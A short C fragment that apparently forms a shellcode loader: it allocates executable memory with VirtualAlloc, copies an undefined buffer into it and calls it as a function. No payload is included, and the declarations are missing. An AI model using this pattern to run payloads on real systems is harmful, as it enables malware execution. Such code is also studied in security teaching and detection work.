main()
{
	Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, buf, sizeof(buf));
	((void(*)())Memory)();
}
